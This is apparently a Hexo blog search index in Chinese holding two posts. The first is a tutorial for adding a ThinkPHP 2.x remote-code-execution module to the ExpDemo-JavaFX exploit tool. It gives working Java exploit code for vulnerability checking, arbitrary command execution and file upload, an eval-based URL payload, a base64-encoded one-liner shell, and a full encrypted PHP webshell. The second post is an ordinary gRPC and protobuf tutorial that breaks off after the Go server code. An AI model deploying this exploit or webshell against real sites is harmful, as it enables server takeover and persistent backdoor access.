<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ExpDemo-JavaFX工具新增漏洞编写教程</title>
    <url>/2021/08/19/ExpDemo-JavaFX%E5%B7%A5%E5%85%B7%E6%96%B0%E5%A2%9E%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p>  为了提高大佬们提交PR的积极性，我也是拼了（<del>这样我就可以名正言顺的偷懒了</del>）</p>
</blockquote>
<h2 id="0x01-选漏洞，新建文件"><a href="#0x01-选漏洞，新建文件" class="headerlink" title="0x01 选漏洞，新建文件"></a>0x01 选漏洞，新建文件</h2><p>比如 ThinkPHP2.x的任意代码执行，使用vulhub搭建漏洞</p>
<p><a href="https://vulhub.org/#/environments/thinkphp/2-rce/">https://vulhub.org/#/environments/thinkphp/2-rce/</a></p>
<p>docker-compose up -d 一键搭建</p>
<p>现在还没有ThinkPHP 相关的利用架子，界面显示也没有，只是有个按钮(我特意挑的，从图到exp编写一块教)</p>
<h3 id="1-1-先把界面立起来"><a href="#1-1-先把界面立起来" class="headerlink" title="1.1 先把界面立起来"></a>1.1 先把界面立起来</h3><p>在<strong>src&#x2F;main&#x2F;resources</strong>下可以看到存在这么多<strong>fxml</strong>文件，直接复制一个<strong>Struts2.fxml</strong>,命名为<strong>ThinkPHP.fxml</strong> 简答方便（若有大佬对界面不满意，请自个调，我不管了）<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011617.png" alt="image-20210818201601174"></p>
<p>然后将<strong>Struts2Controller</strong>改为<strong>ThinkPHPController</strong>, 再将85行的test.jsp 改为 test.php<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011626.png" alt="image-20210818201939529"></p>
<p>会发现爆红，这是因为还没有<strong>ThinkPHP</strong>的逻辑控制。到这里再复制一份<strong>Struts2Controller.java</strong>改为<strong>ThinkPHPController.java</strong>即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011632.png" alt="image-20210818202113039"></p>
<p>还有一个，你要在界面有个按钮去控制显示，在<strong>src&#x2F;main&#x2F;resources&#x2F;fxml&#x2F;Main.fxml</strong>的43行，现在已经有个<strong>ThinkPHP</strong>的按钮了，如果没有，复制一行&lt;JFXButton …&gt; ，然后将<strong>accessibleText</strong>改为你新建的**.fxml<strong>一模一样的名字，再将</strong>text**改成你想显示的名称<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011643.png" alt="image-20210818202513653"></p>
<p>好了，现在界面好了，运行<strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;AppStartUp.java</strong>看下吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011649.png" alt="image-20210818202826787"></p>
<p>新建一个界面简单吧</p>
<h3 id="1-2-新建exp文件"><a href="#1-2-新建exp文件" class="headerlink" title="1.2 新建exp文件"></a>1.2 新建exp文件</h3><p>现在exp包下，还没有新建php相关的漏洞（建包主要是为了方便管理，同类型的，放一个包下）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011658.png" alt="image-20210818200412029"></p>
<p>右键新建java文件，<strong>php.thinkphp.ThinkPHP2x</strong> ,这表示在<strong>php</strong>包下的<strong>thinkphp</strong>包下新建<strong>ThinkPHP2x.java</strong>文件，没有包则创建包（你就说细不细吧）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011704.png" alt="image-20210818200550535"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011711.png" alt="image-20210818200831938"></p>
<p>一个EXP文件首先要实现<strong>ExploitInterface</strong>接口，看见爆红不要慌</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011717.png" alt="image-20210818200904924"></p>
<p>鼠标悬浮上去，点击实现全部方法（我就当大佬们都不会java。怎么可能呢？！）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011728.png" alt="image-20210818200947514"></p>
<p>框架好了，现在填EXP，具体方法作用一看就懂了,在类中再声明两个属性，一个targe、一个isVul</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011734.png" alt="image-20210818212249668"></p>
<h3 id="1-3-代码和界面联动"><a href="#1-3-代码和界面联动" class="headerlink" title="1.3 代码和界面联动"></a>1.3 代码和界面联动</h3><p>接下来关注刚新建的<strong>ThinkPHPController.java</strong>文件，修改49行的 <strong>BASICINFO</strong> 和 <strong>STRUTS2</strong> 属性为<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011742.png" alt="image-20210818214305224"></p>
<p>使用Ctrl + r 健,将 STRUTS2 全部替换为 ThinkPHP </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011749.png" alt="image-20210818214503421">   再添加一个属性，默认上传的shell</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SHELL</span> <span class="operator">=</span> <span class="string">&quot;&lt;?php\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;@error_reporting(0);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;session_start();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $key=\&quot;e45e329feb5d925b\&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$_SESSION[&#x27;k&#x27;]=$key;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tsession_write_close();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$post=file_get_contents(\&quot;php://input\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tif(!extension_loaded(&#x27;openssl&#x27;))\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$t=\&quot;base64_\&quot;.\&quot;decode\&quot;;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=$t($post.\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\telse\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=openssl_decrypt($post, \&quot;AES128\&quot;, $key);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $arr=explode(&#x27;|&#x27;,$post);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $func=$arr[0];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $params=$arr[1];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tclass C&#123;public function __invoke($p) &#123;eval($p.\&quot;\&quot;);&#125;&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    @call_user_func(new C(),$params);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;?&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>238行也修改 test.jsp 改为 test.php</p>
<p>修改<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011758.png" alt="image-20210819011243601"></p>
<p>这个文件修改完毕，不用动了，以后再添加thinkphp相关漏洞，只需要改<strong>BASICINFO</strong>中的描述信息(不加也可,翻遍看)，<strong>ThinkPHP</strong> 还是要改的，这个是选择漏洞列表中的东西，往后添加就行。</p>
<p>下面去 <strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;tools&#x2F;Tools.java</strong>文件， 找到184行的<strong>getExploit</strong>方法。</p>
<p>添加一个判断就行，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011804.png" alt="image-20210818215324824"></p>
<p>这就完了，看着图多，其实就几步，主要是为了详细</p>
<h2 id="0x02-写EXP的具体实现"><a href="#0x02-写EXP的具体实现" class="headerlink" title="0x02 写EXP的具体实现"></a>0x02 写EXP的具体实现</h2><h3 id="2-1-checkVul-首先检测漏洞是否存在"><a href="#2-1-checkVul-首先检测漏洞是否存在" class="headerlink" title="2.1 checkVul - 首先检测漏洞是否存在"></a>2.1 checkVul - 首先检测漏洞是否存在</h3><p>Vulhub 也给了payload，方便省事，使用poc打一下,原poc是输出phpinfo,这里改成了输出一串字符<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011812.png" alt="image-20210818213036338"></p>
<p>转成java,都是最基础的写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测漏洞是否存在</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(md5(123))&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交</span></span><br><span class="line">            <span class="comment">// 注意 这要用 try  catch 捕获一下异常</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + check_payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 看回显，是否存在 202cb962ac59075b964b07152d234b70</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> result.contains(<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isVul = <span class="literal">true</span>;  <span class="comment">// 存在漏洞</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出错误日志</span></span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>写完测试一下</p>
<p>运行<strong>AppStartUp.java</strong>，测试一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011828.png" alt="image-20210818224529463"></p>
<p>成功，而且可以设置代理，走bp，看具体流量</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011837.png" alt="image-20210818224612182"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011844.png" alt="image-20210818224629863"></p>
<h3 id="2-2-getWebPath-获取网站根目录"><a href="#2-2-getWebPath-获取网站根目录" class="headerlink" title="2.2 getWebPath 获取网站根目录"></a>2.2 getWebPath 获取网站根目录</h3><p>这个写不写都行，这里写一下吧,thinkphp 可以通过<code>realpath(__ROOT__)</code>来获取网站的根路径，改下payload就好</p>
<p><code>/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的web路径，有最好，没有也无所谓</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个payload会把 html网页也给输出，这里分割简单去除一下</span></span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;命令执行失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011857.png" alt="image-20210818230017745"></p>
<h3 id="2-3-exeCmd-执行命令"><a href="#2-3-exeCmd-执行命令" class="headerlink" title="2.3 exeCmd  执行命令"></a>2.3 exeCmd  执行命令</h3><p>这里先将 <strong>isVul</strong>方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload <code>/index.php?s=/index/index/name/$&#123;@print(system(whoami))&#125;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令执行</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(system(payload))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试通过</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011905.png" alt="image-20210818230642660"></p>
<h3 id="2-4-uploadFile-上传shell"><a href="#2-4-uploadFile-上传shell" class="headerlink" title="2.4 uploadFile 上传shell"></a>2.4 uploadFile 上传shell</h3><p>Payload <code>http://127.0.0.1:8080/index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code> 这是网上的payload，上传后使用蚁剑连接即可</p>
<p>虽然，直接使用这个payload也可用，但不方便我们自定义上传的shell马</p>
<p>@bewhale 师傅的 thinkphp利用工具 <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a> 中使用这个payload来上传文件</p>
<p><code>/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#39;bak.php&#39;,base64_decode(&#39;PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B&#39;)); </code></p>
<p>拿来直接用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(String fileContent, String filename, String platform)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 对文件 base64 编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileContent.getBytes());</span><br><span class="line">        <span class="comment">// 注意一下，需要对 base64 编码后的在进行一次url编码，</span></span><br><span class="line">        base64Data = URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#x27;&quot;</span> + filename + <span class="string">&quot;&#x27;,base64_decode(&#x27;&quot;</span> + base64Data + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> HttpTool.getStatus(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">        System.out.println(status);</span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">200</span>) &#123;</span><br><span class="line">            result = <span class="string">&quot;上传成功! 路径： &quot;</span> + <span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result =  <span class="string">&quot;上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011913.png" alt="image-20210819011430581"></p>
<p>打完收工</p>
]]></content>
      <categories>
        <category>GitHub工具</category>
      </categories>
      <tags>
        <tag>GitHub工具</tag>
      </tags>
  </entry>
  <entry>
    <title>GRPC 学习笔记</title>
    <url>/2022/08/11/GRPC%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>gRPC 是 Google 开源的一个远程过程调用(Remote Procedure Call) 框架，在 gRPC 中，客户端应用程序可以直接调用不同机器上的服务器应用程序上的方法，就像它是本地对象一样，更容易创建分布式应用程序和服务。默认情况下，gRPC 使用 <code>协议缓冲区 </code> 通信, 并支持以下语言:</p>
<ul>
<li><a href="https://grpc.io/docs/languages/csharp/">C#</a></li>
<li><a href="https://grpc.io/docs/languages/cpp/">C++</a></li>
<li><a href="https://grpc.io/docs/languages/dart/">Dart</a></li>
<li><a href="https://grpc.io/docs/languages/go/">Go</a></li>
<li><a href="https://grpc.io/docs/languages/java/">Java</a></li>
<li><a href="https://grpc.io/docs/languages/kotlin/">Kotlin</a></li>
<li><a href="https://grpc.io/docs/languages/node/">Node</a></li>
<li><a href="https://grpc.io/docs/languages/objective-c/">Objective-C</a></li>
<li><a href="https://grpc.io/docs/languages/php/">PHP</a></li>
<li><a href="https://grpc.io/docs/languages/python/">Python</a></li>
<li><a href="https://grpc.io/docs/languages/ruby/">Ruby</a></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202303051023511.png" alt="image.png"></p>
<h2 id="协议缓冲区-protocol-buffers"><a href="#协议缓冲区-protocol-buffers" class="headerlink" title="协议缓冲区 (protocol buffers)"></a>协议缓冲区 (protocol buffers)</h2><blockquote>
<p>协议缓冲区提供了一种语言中立、平台中立、可扩展的机制，用于以向前兼容和向后兼容的方式序列化结构化数据。它类似于 JSON，只是它更小更快，并且生成本地语言绑定。<br>协议缓冲区是定义语言（在 .proto文件中创建）、proto 编译器生成的与数据接口的代码、特定于语言的运行时库以及写入文件（或通过网络连接）。</p>
</blockquote>
<p>使用协议缓冲区的第一步是定义要在_proto 文件_中序列化的数据的结构：这是一个带有<code>.proto</code>扩展名的普通文本文件。协议缓冲区数据被构造为<code>_消息_</code>，其中每条消息都是一个小的信息逻辑记录，包含一系列称为<code>_字段_</code>的名称-值对。这是一个简单的例子：</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定使用 proto3 语法</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明包名，防止冲突</span></span><br><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息, 指定字段类型，并为字段分配一个唯一的编号</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloRequest</span>&#123;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int64</span> id = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更多语法请看 <a href="https://developers.google.com/protocol-buffers/docs/proto3">https://developers.google.com/protocol-buffers/docs/proto3</a></p>
<h3 id="生成-gRPC-代码"><a href="#生成-gRPC-代码" class="headerlink" title="生成 gRPC 代码"></a>生成 gRPC 代码</h3><figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定使用 proto3 语法</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定最后生成的go文件是处在哪个目录哪个包中，.代表在当前目录生成，helloworld 代表了生成的go文件的包名是 helloworld。</span></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;.;helloworld&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明包名，防止冲突</span></span><br><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 远程调用定义的消息类型</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Greeter</span> &#123;</span><br><span class="line">  <span class="comment">// Greeter 服务有一个 SayHello 方法，可以让服务端从远程客户端接收一个 HelloRequest 消息后，返回 HelloReply 消息</span></span><br><span class="line">  <span class="comment">// 服务端必须实现该方法</span></span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SayHello (HelloRequest) <span class="keyword">returns</span> (HelloReply) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息, 指定字段类型，并为字段分配一个唯一的编号</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloRequest</span>&#123;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int64</span> id = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloReply</span> &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一旦定义好服务，我们可以使用 protocol buffer 编译器 <code>protoc</code> 来生成创建应用所需的特定客户端和服务端的代码。<br>首先运行 <code>brew install protobuf</code> 安装 <code>protoc</code>  <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; protoc --version</span><br><span class="line">libprotoc 3.19.4</span><br></pre></td></tr></table></figure>
<p>其次安装 go 的插件 </p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest</span><br><span class="line">go install google.golang.org/protobuf/cmd/protoc-gen-go@latest </span><br></pre></td></tr></table></figure>
<p>默认下载到<code>$GOPATH/bin</code>下。<br>指定源目录（应用程序的源代码所在的位置——如果不提供值，则使用当前目录）、目标目录（希望生成的代码所在的位置；通常与$SRC_DIR相同） ，以及<code>.protp</code>文件. </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">protoc  --go_out=helloworld --go-grpc_out=helloworld helloworld/helloworld.proto</span><br></pre></td></tr></table></figure>
<p>生成两个文件：</p>
<ul>
<li><code>helloworld.pb.go</code>  文件 ，包含用于填充、序列化和检索请求和响应消息类型的所有协议缓冲区代码。</li>
<li><code>helloworld_grpc.pb.go</code> 文件, 其中包含以下内容：<ul>
<li>客户端使用<code>Greeter</code>服务中定义的方法调用的接口类型（或存根）。</li>
<li>服务器要实现的接口类型，也可以使用<code>Greeter</code>服务中定义的方法。</li>
</ul>
</li>
</ul>
<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">    pb <span class="string">&quot;grpcTest/helloworld&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// server is used to implement helloworld.GreeterServer.</span></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">    pb.UnimplementedGreeterServer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须实现 SayHello 方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// SayHello implements helloworld.GreeterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span></span> SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="type">error</span>) &#123;</span><br><span class="line">    log.Printf(<span class="string">&quot;Received: %v %d&quot;</span>, in.GetName(), in.GetId())</span><br><span class="line">    <span class="keyword">return</span> &amp;pb.HelloReply&#123;Message: fmt.Sprintf(<span class="string">&quot;Hello %s %d\n&quot;</span>, in.GetName(), in.GetId())&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">@author: yhy</span></span><br><span class="line"><span class="comment">@since: 2022/8/8</span></span><br><span class="line"><span class="comment">@desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    lis, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8999&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;failed to listen: %v&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    s := grpc.NewServer()</span><br><span class="line">    </span><br><span class="line">    pb.RegisterGreeterServer(s, &amp;server&#123;&#125;)</span><br><span class="line">    log.Printf(<span class="string">&quot;server listening at %v&quot;</span>, lis.Addr())</span><br><span class="line">    err = s.Serve(lis)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
